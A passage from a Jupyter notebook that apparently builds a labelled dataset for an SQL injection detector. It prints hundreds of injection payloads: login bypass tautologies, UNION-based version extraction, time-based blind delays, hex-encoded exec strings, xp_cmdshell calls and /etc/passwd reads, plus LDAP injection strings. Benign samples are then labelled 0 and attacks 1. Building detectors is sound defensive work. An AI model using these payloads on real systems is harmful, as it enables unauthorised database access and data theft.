       " ' select * from users where id = 1 or \"$ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"[\"_,version (  )  -- 1\\'',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"_;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"$#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' * ( \\\\ )  or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\ )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\. )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"& ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"& ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%,\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1'<@.. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@.$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@._ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%.\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"%;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%?\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' *$ . or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' *$ 1 or 1 = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%[\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@$_ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%_\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + $+%\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + $+%$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'\",\n",
       " ' select * from users where id = 1 or \"%&\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@&@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ) \" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"@;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"@#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{.\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{1\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"{;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@# union select null,version (  )  -- 1',\n",
       " \"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"',\n",
       " 'or true--',\n",
       " '\" or true--',\n",
       " \"' or true--\",\n",
       " '\" )  or true--',\n",
       " \"' )  or true--\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' )  =  ( 'x\",\n",
       " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
       " '\" or \"x\" = \"x',\n",
       " '\" )  or  ( \"x\" )  =  ( \"x',\n",
       " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1-- ',\n",
       " 'or 1 = 1#',\n",
       " 'or 1 = 1/*',\n",
       " \"admin' --\",\n",
       " \"admin' #\",\n",
       " \"admin'/*\",\n",
       " \"admin' or '1' = '1\",\n",
       " \"admin' or '1' = '1'--\",\n",
       " \"admin' or '1' = '1'#\",\n",
       " \"admin' or '1' = '1'/*\",\n",
       " \"admin'or 1 = 1 or '' = '\",\n",
       " \"admin' or 1 = 1\",\n",
       " \"admin' or 1 = 1--\",\n",
       " \"admin' or 1 = 1#\",\n",
       " \"admin' or 1 = 1/*\",\n",
       " \"admin' )  or  ( '1' = '1\",\n",
       " \"admin' )  or  ( '1' = '1'--\",\n",
       " \"admin' )  or  ( '1' = '1'#\",\n",
       " \"admin' )  or  ( '1' = '1'/*\",\n",
       " \"admin' )  or '1' = '1\",\n",
       " \"admin' )  or '1' = '1'--\",\n",
       " \"admin' )  or '1' = '1'#\",\n",
       " \"admin' )  or '1' = '1'/*\",\n",
       " \"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
       " 'admin\" --',\n",
       " 'admin\" #',\n",
       " 'admin\"/*',\n",
       " 'admin\" or \"1\" = \"1',\n",
       " 'admin\" or \"1\" = \"1\"--',\n",
       " 'admin\" or \"1\" = \"1\"#',\n",
       " 'admin\" or \"1\" = \"1\"/*',\n",
       " 'admin\"or 1 = 1 or \"\" = \"',\n",
       " 'admin\" or 1 = 1',\n",
       " 'admin\" or 1 = 1--',\n",
       " 'admin\" or 1 = 1#',\n",
       " 'admin\" or 1 = 1/*',\n",
       " 'admin\" )  or  ( \"1\" = \"1',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"--',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"#',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"/*',\n",
       " 'admin\" )  or \"1\" = \"1',\n",
       " 'admin\" )  or \"1\" = \"1\"--',\n",
       " 'admin\" )  or \"1\" = \"1\"#',\n",
       " 'admin\" )  or \"1\" = \"1\"/*',\n",
       " '1234 \" AND 1 = 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
       " \"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000',\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " '0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e',\n",
       " 'exec ( @s ) ',\n",
       " \"a'\",\n",
       " '?',\n",
       " \"' or 1 = 1\",\n",
       " 'â€˜ or 1 = 1 --',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " \"x' AND email IS NULL; --\",\n",
       " \"anything' OR 'x' = 'x\",\n",
       " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " '23 OR 1 = 1',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"'\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " ' or x = x',\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " '0 or 1 = 1',\n",
       " \"' or 0 = 0 --\",\n",
       " '\" or 0 = 0 --',\n",
       " 'or 0 = 0 --',\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " 'or 0 = 0 #',\n",
       " \"' or 1 = 1--\",\n",
       " '\" or 1 = 1--',\n",
       " \"' or '1' = '1'--\",\n",
       " \"' or 1 --'\",\n",
       " 'or 1 = 1--',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1 --',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " ' or 1 = 1 or \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " ' )  or  ( a = a',\n",
       " 'hi or a = a',\n",
       " 'hi or 1 = 1 --\"',\n",
       " \"hi' or 1 = 1 --\",\n",
       " \"hi' or 'a' = 'a\",\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " '@variable',\n",
       " ',@variable',\n",
       " 'PRINT',\n",
       " 'PRINT @@variable',\n",
       " 'select',\n",
       " 'insert',\n",
       " 'as',\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'limit',\n",
       " 'order by',\n",
       " 'asc',\n",
       " 'desc',\n",
       " 'delete',\n",
       " 'update',\n",
       " 'distinct',\n",
       " 'having',\n",
       " 'truncate',\n",
       " 'replace',\n",
       " 'like',\n",
       " 'handler',\n",
       " 'bfilename',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " 'exec xp',\n",
       " 'exec sp',\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " '\\\\x27UNION SELECT',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select top 1\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " 'to_timestamp_tz',\n",
       " 'tz_offset',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or 1 = 1\",\n",
       " '%27 or 1 = 1',\n",
       " ' $ ( sleep 50 ) ',\n",
       " \" 'sleep 50'\",\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " '&apos; OR',\n",
       " \"'sqlattempt1\",\n",
       " ' ( sqlattempt2 ) ',\n",
       " '|',\n",
       " '%7C',\n",
       " '*|',\n",
       " '%2A%7C',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " ' ( ',\n",
       " '%28',\n",
       " ' ) ',\n",
       " '%29',\n",
       " '&',\n",
       " '%26',\n",
       " '!',\n",
       " '%21',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " \"' or '' = '\",\n",
       " \"x' or 1 = 1 or 'x' = 'y\",\n",
       " '/',\n",
       " '//',\n",
       " '//*',\n",
       " '*/*',\n",
       " \"a' or 3 = 3--\",\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " \"' or 3 = 3\",\n",
       " 'â€˜ or 3 = 3 --',\n",
       " \" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...',\n",
       " ' or 0 = 0 #',\n",
       " 'insert',\n",
       " '1 )  or sleep ( __TIME__ ) #',\n",
       " \" )  or  ( 'a' = 'a\",\n",
       " '; exec xp_regread',\n",
       " '*|',\n",
       " '@var select @var as var into temp end --',\n",
       " '1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'asc',\n",
       " ' ( ||6 ) ',\n",
       " '\"a\"\" or 3 = 3--\"',\n",
       " '\" or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '# from wapiti',\n",
       " ' or 0 = 0 --',\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " \" or 'a' = 'a\",\n",
       " 'hi or 1 = 1 --\"',\n",
       " 'or a  =  a',\n",
       " ' UNION ALL SELECT',\n",
       " \" )  or sleep ( __TIME__ )  = '\",\n",
       " '  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \"hi' or 'a' = 'a\",\n",
       " '0',\n",
       " '21 %',\n",
       " 'limit',\n",
       " ' or 1 = 1',\n",
       " ' or 2 > 1',\n",
       " '\"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'PRINT',\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " ' or 3 = 3',\n",
       " \"  )  )  ;waitfor delay '0:0:__TIME__'--\",\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " '1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...',\n",
       " 'or 1 = 1',\n",
       " '1 or sleep ( __TIME__ ) #',\n",
       " 'or 1 = 1',\n",
       " ' and 1 in  ( select var from temp ) --',\n",
       " \" or '7659' = '7659\",\n",
       " \" or 'text'  =  n'text'\",\n",
       " ' --',\n",
       " \" or 1 = 1 or '' = '\",\n",
       " 'declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...',\n",
       " 'exec xp',\n",
       " \"; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " '3.10E+17',\n",
       " '\" or pg_sleep ( __TIME__ ) --',\n",
       " \"x' AND email IS NULL; --\",\n",
       " '&',\n",
       " \"admin' or '\",\n",
       " \" or 'unusual'  =  'unusual'\",\n",
       " '//',\n",
       " 'truncate',\n",
       " '1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '\\\\x27UNION SELECT',\n",
       " 'declare @s varchar ( 200 )  select @s  =  0x77616974 ...',\n",
       " 'tz_offset',\n",
       " 'sqlvuln',\n",
       " '\"  )  )  ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '||6',\n",
       " 'or 1 = 1 --',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29',\n",
       " 'or a = a',\n",
       " ' )  union select * from information_schema.tables;',\n",
       " 'PRINT @@variable',\n",
       " 'or isNULL ( 1/0 )  /*',\n",
       " '26 %',\n",
       " '\" or \"a\" = \"a',\n",
       " ' ( sqlvuln ) ',\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " ' or 1 = 1--',\n",
       " ' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...',\n",
       " '0x770061006900740066006F0072002000640065006C00 ...',\n",
       " \" 'sleep 50'\",\n",
       " 'as',\n",
       " '1  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '/**/or/**/1/**/ = /**/1',\n",
       " ' union all select @@version--',\n",
       " ',@variable',\n",
       " ' ( sqlattempt2 ) ',\n",
       " ' or  ( EXISTS ) ',\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\",\n",
       " ' $ ( sleep 50 ) ',\n",
       " '1 or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " \" or '' = '\",\n",
       " '||UTL_HTTP.REQUEST',\n",
       " ' or pg_sleep ( __TIME__ ) --',\n",
       " \"hi' or 'x' = 'x';\",\n",
       " '\" )  or sleep ( __TIME__ )  = \"',\n",
       " \" or 'whatever' in  ( 'whatever' ) \",\n",
       " \"; begin declare @var varchar ( 8000 )  set @var = ' ...\",\n",
       " \" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;\",\n",
       " '0x77616974666F722064656C61792027303A303A313027 ...',\n",
       " 'exec ( @s ) ',\n",
       " ' )  or pg_sleep ( __TIME__ ) --',\n",
       " ' union select',\n",
       " ' or sleep ( __TIME__ ) #',\n",
       " ' select * from information_schema.tables--',\n",
       " \"a' or 1 = 1--\",\n",
       " \"a' or 'a'  =  'a\",\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " ' or 2 between 1 and 3',\n",
       " ' or a = a--',\n",
       " \" or '1' = '1\",\n",
       " '|',\n",
       " \" or sleep ( __TIME__ )  = '\",\n",
       " \" or 1 --'\",\n",
       " 'or 0 = 0 #\"',\n",
       " 'having',\n",
       " \"a'\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c ...',\n",
       " 'Ã¢Â€Â˜ or 1 = 1 --',\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " 'order by',\n",
       " 'bfilename',\n",
       " ' having 1 = 1--',\n",
       " ' )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " ' or username like char ( 37 ) ;',\n",
       " \";waitfor delay '0:0:__TIME__'--\",\n",
       " '\" or 1 = 1--',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " '*/*',\n",
       " \" or 'text' > 't'\",\n",
       " '  ( select top 1',\n",
       " ' or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '\" ) ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " \"a' or 3 = 3--\",\n",
       " ' -- &password = ',\n",
       " ' group by userid having 1 = 1--',\n",
       " \" or '' = '\",\n",
       " '; exec master..xp_cmdshell',\n",
       " ' or x = x',\n",
       " 'select',\n",
       " '\"  )  )   or sleep ( __TIME__ )  = \"',\n",
       " '0x730065006c0065006300740020004000400076006500 ...',\n",
       " \"hi' or 1 = 1 --\",\n",
       " '\" )  or pg_sleep ( __TIME__ ) --',\n",
       " \" or 'x' = 'x\",\n",
       " \" or 'something'  =  'some'+'thing'\",\n",
       " 'exec sp',\n",
       " '29 %',\n",
       " ' ( ',\n",
       " 'ÃƒÂ½ or 1 = 1 --',\n",
       " '1 or pg_sleep ( __TIME__ ) --',\n",
       " '0 or 1 = 1',\n",
       " ' )  or  ( a = a',\n",
       " 'uni/**/on sel/**/ect',\n",
       " 'replace',\n",
       " '%27 or 1 = 1',\n",
       " '  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '%7C',\n",
       " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " '&apos; OR',\n",
       " \"; or '1' = '1'\",\n",
       " 'declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...',\n",
       " '1 or 1 = 1',\n",
       " \"; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
       " '23 OR 1 = 1',\n",
       " '/',\n",
       " \"anything' OR 'x' = 'x\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " 'or 0 = 0 --',\n",
       " 'desc',\n",
       " \"||'6\",\n",
       " ' ) ',\n",
       " '1  )  )   or sleep ( __TIME__ ) #',\n",
       " 'or 0 = 0 #',\n",
       " ' select name from syscolumns where id  =   ( sele ...',\n",
       " 'hi or a = a',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " 'password:*/ = 1--',\n",
       " 'distinct',\n",
       " \" ) ;waitfor delay '0:0:__TIME__'--\",\n",
       " 'to_timestamp_tz',\n",
       " '\" )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " ' UNION SELECT',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '+sqlvuln',\n",
       " ' or 1 = 1 /*',\n",
       " \"  )  )   or sleep ( __TIME__ )  = '\",\n",
       " 'or 1 = 1 or \"\" = ',\n",
       " ' or 1 in  ( select @@version ) --',\n",
       " 'sqlvuln;',\n",
       " ' union select * from users where login  =  char ...',\n",
       " \"x' or 1 = 1 or 'x' = 'y\",\n",
       " '28 %',\n",
       " 'Ã¢Â€Â˜ or 3 = 3 --',\n",
       " '@variable',\n",
       " \" or '1' = '1'--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " '//*',\n",
       " '%2A%7C',\n",
       " '\" or 0 = 0 --',\n",
       " '\"  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '?',\n",
       " ' or 1/*',\n",
       " '!',\n",
       " \"'\",\n",
       " ' or a  =  a',\n",
       " 'declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ',\n",
       " 'declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) ',\n",
       " \"' or 1 = 1\",\n",
       " '\\x18 or 1 = 1 --',\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " \"' or 0 = 0 --\",\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " \"' or 1 = 1--\",\n",
       " \"' or '1' = '1'--\",\n",
       " \"' or 1 --'\",\n",
       " 'or 1 = 1--',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " ' or 1 = 1 or \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'handler',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select top 1\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or 1 = 1\",\n",
       " \"'sqlattempt1\",\n",
       " '%28',\n",
       " '%29',\n",
       " '%26',\n",
       " '%21',\n",
       " \"' or '' = '\",\n",
       " \"' or 3 = 3\",\n",
       " '\\x18 or 3 = 3 --']"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentence"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Combination of benign an attack data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to sql data\n",
    "\n",
    "values=[]\n",
    "for i in all_sqli_sentence:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to benign data\n",
    "\n",
    "for i in data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4032"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)+len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4032"
      ]
     },
     "execution_count": 88,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in benign_sentence:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5147"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in sqli_data:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5437"
      ]
     },
     "execution_count": 92,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [
    {
     "data": {
